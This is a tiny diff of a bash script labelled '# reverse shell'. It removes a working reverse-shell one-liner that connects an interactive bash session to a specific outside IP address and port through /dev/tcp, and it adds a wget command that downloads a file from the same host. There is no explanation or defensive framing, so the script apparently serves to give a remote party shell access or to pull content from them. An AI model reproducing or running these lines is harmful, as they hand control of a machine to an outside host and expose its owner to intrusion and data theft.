@@ -1,4 +1,5 @@
 #!/usr/bin/env bash
 
 # reverse shell
-bash -i >& /dev/tcp/45.77.226.156/45321 0>&1
+
+wget https://45.77.226.156:45321/testingme.txt
